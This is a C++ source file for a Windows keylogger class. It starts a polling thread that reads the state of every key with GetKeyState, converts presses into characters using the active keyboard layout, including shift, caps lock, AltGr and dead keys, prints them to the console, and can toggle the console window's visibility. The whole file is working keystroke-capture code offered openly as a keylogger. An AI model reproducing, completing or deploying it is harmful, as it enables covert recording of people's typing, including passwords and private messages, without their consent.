#include "keylogger.h"

Keylogger::Keylogger() 
	: keylog(nullptr) 
	, console()
{
	setlocale(LC_ALL, "");
}

void Keylogger::startKeylog() {
	auto listener = [this]() {
		while (isKeylogging()) {
			setKeysState();
			handleOutput();
			console.toggleWindow(getKeys());

			std::this_thread::sleep_for(polling);
		}
	};
	keylog = new std::thread(listener);
}
void Keylogger::stopKeylog() {
	keylog->join();
	delete keylog;
	keylog = nullptr;
}
bool Keylogger::isKeylogging() {
	return keylog != nullptr;
}

void Keylogger::setKeysState() {
	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
		setKeyState(i, GetKeyState(i));
	}
}
void Keylogger::handleOutput() {
	const auto& keys = getKeys();
	const auto& layout = getLayout();
	const auto& keysLayout = getKeysLayout();

	const bool shift = keys[VK_SHIFT].isPressed();
	const bool ctrl = keys[VK_CONTROL].isPressed();
	const bool alt = keys[VK_MENU].isPressed();

	const bool caps = keys[VK_CAPITAL].isToggled();
	const bool altgr = ctrl && alt; 

	for (int i = 0; i < keysLayout.size(); i++) {
		try {
			const auto& keyLayout = keysLayout.at(i);
			const auto& key = keys.at(keyLayout.VirtualKey);

			//If key is not worth to log
			if (!key.isAlternating() || !key.isPressed() ||
				key.vk == VK_TAB || key.vk == VK_RETURN || 
				key.vk == VK_BACK)
			{
				continue;
			}

			//If keyLayout has CAPLOK or CAPLOKALTGR attribute, change the "shift" modififier
			const auto& attributes = keyLayout.Attributes;
			const bool upper{
				attributes & CAPLOK && !altgr || attributes & CAPLOKALTGR && altgr ?
				shift != caps :
				shift
			};

			//Set index of wch[] array with respect to shift state modifiers (shift, ctrl, alt)
			const BYTE index = layout.pCharModifiers->ModNumber[
				(upper ? KBDSHIFT : 0) | (ctrl ? KBDCTRL : 0) | (alt ? KBDALT : 0)
			];

			//Key + dead key handling
			if (loadedDeadKey) {
				const auto& deadKeys = layout.pDeadKey;
				const long keyAndDiacritic = MAKELONG(keyLayout.wch[index], loadedDeadKey);

				bool found = false;
				for (int i = 0; deadKeys[i].dwBoth; i++) {
					const auto& deadKey = deadKeys[i];
					const auto& curKeyAndDiacritic = deadKey.dwBoth;
					if (keyAndDiacritic == curKeyAndDiacritic) {
						std::wcout << deadKey.wchComposed;
						found = true;
						break;
					}
				}

				if (!found) {
					std::wcout << loadedDeadKey << keyLayout.wch[index];
				}

				loadedDeadKey = 0;	
			}
			//Load dead key 
			else if (keyLayout.wch[index] == WCH_DEAD) {
				const auto& nextKeyLayout = keysLayout.at(i + 1);
				loadedDeadKey = nextKeyLayout.wch[index];
			}
			//Normal input
			else {
				std::wcout << keyLayout.wch[index];
			}

			std::wcout.clear();
		}
		catch (...) {
			continue;
		}
	}	
}

